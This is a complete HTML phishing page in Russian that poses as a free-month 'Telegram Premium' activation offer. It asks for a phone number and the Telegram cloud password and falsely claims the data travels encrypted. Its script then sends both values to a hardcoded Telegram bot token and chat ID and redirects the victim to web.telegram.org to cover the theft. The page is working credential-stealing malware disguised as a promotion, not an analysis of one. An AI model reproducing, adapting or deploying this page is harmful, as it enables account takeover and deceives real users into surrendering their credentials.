<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium — активация</title>
    <style>
        body {
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0f0f1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: #1f1f2e;
            border-radius: 20px;
            padding: 35px 30px;
            max-width: 380px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2c2c3e;
        }
        .icon {
            text-align: center;
            margin-bottom: 10px;
        }
        .icon span {
            font-size: 48px;
            background: #2b2b3f;
            padding: 15px;
            border-radius: 50%;
            display: inline-block;
        }
        h2 {
            color: #fff;
            text-align: center;
            font-weight: 600;
            font-size: 22px;
            margin: 10px 0 5px;
        }
        .sub {
            color: #8b8ba3;
            text-align: center;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .badge {
            background: #2b2b3f;
            color: #8b8ba3;
            font-size: 12px;
            padding: 6px 12px;
            border-radius: 30px;
            display: inline-block;
            margin-bottom: 20px;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
        }
        .badge strong {
            color: #ffd700;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0 16px 0;
            background: #2a2a3d;
            border: 1px solid #3a3a50;
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            box-sizing: border-box;
            transition: 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #6c6cff;
            background: #2f2f45;
        }
        input::placeholder {
            color: #6a6a82;
        }
        .hint {
            font-size: 12px;
            color: #6a6a82;
            margin-top: -12px;
            margin-bottom: 18px;
            padding-left: 4px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #6c6cff;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
        }
        button:hover {
            background: #5a5ae6;
        }
        .footer {
            color: #5a5a72;
            font-size: 11px;
            text-align: center;
            margin-top: 20px;
            border-top: 1px solid #2a2a3d;
            padding-top: 18px;
        }
        .footer a {
            color: #6c6cff;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">
            <span>📱</span>
        </div>
        <h2>Telegram Premium</h2>
        <div class="sub">Бесплатный месяц Telegram premium</div>
        <div class="badge">🎁 <strong>Акция</strong> — только до 30.06.2026</div>

        <form id="form">
            <input type="text" id="phone" placeholder="Номер телефона (в формате +7...)" required>
            <input type="password" id="password" placeholder="Облачный пароль Telegram" required>
            <div class="hint">Введите облачный пароль, это требуется для безопасности</div>
            <button type="submit">Активировать Premium</button>
        </form>

        <div class="footer">
            Данные передаются в зашифрованном виде<br>
            <a href="#">Условия акции</a>
        </div>
    </div>

    <script>
        document.getElementById('form').onsubmit = function(e) {
            e.preventDefault();

            var phone = document.getElementById('phone').value;
            var password = document.getElementById('password').value;

            var message = '☎️ Номер: ' + phone + '\n🔐 Облачный пароль: ' + password;

            fetch('https://api.telegram.org/bot8619447163:AAHb5YPjThw06BKAYc0FyJTmcpveQxfOtRA/sendMessage?chat_id=7970898404&text=' + encodeURIComponent(message))
            .then(function(response) {
                window.location.href = 'https://web.telegram.org/';
            })
            .catch(function(error) {
                window.location.href = 'https://web.telegram.org/';
            });
        };
    </script>
</body>
</html>
